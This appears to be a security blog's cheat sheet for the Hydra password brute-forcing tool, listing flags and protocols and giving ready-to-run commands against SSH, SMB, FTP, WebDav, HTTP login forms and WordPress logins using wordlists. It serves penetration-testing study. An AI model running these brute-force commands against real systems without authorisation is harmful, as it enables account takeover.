+++
author = "Noobosaurus R3x"
title = "Hydra Cheat Sheet"
date = "2023-07-18 11:12"
description = "Hydra Cheat Sheet"
type = [
    "posts"
]
categories = [
    "cheat-sheets"
]
tags = [
    "cheat-sheets"
]
+++
---
# **Basic syntax :**
```bash
hydra [options] <IP> <protocole>
```
---
## Some flags :

`-h` Show help menu  
`-l <username>` Username/login  
`-L <wordlist>` Usernames/login wordlist  
`-p <password>` Password  
`-P <wordlist>` Passwords wordlist  
`-s <PORT>` Specify port  
`-f` Stop bruteforce as soon as username and password are found  
`-R` Restore previous session  
`-t <number>` Number of threads  
`-V` Verbosity  

## Some protocols :

SSH, FTP, POP3, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-HEAD, HTTP-POST, HTTP-GET, IMAP, SMB, SMTP, MySQL, etc...

## Examples :
```bash
hydra -l admin -P rockyou.txt 192.168.10.10 ssh

hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh

hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb
```

## Bruteforce HTTP Post form :
```bash
hydra -l admin -P rockyou.txt 192.168.10.10 http-post-form "/login:username=admin&password=^PASS^:F=Your password is incorrect
```

## Bruteforce Wordpress :
```bash
hydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post '/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

## Bruteforce FTP :
```bash
hydra -L /path/to/userlist.txt -P /path/to/pasword_list.txt 10.10.10.10 -t 4 ftp
```

## Bruteforce WebDav : 
```bash
hydra -L /path/to/userlist.txt -P path/to/pasword_list.txt 10.10.10.10 http-get /webdav
```
---
If you want to watch my video on hydra, in french only : 
{{< youtube id="Fu6Xn8RpO7Q" >}}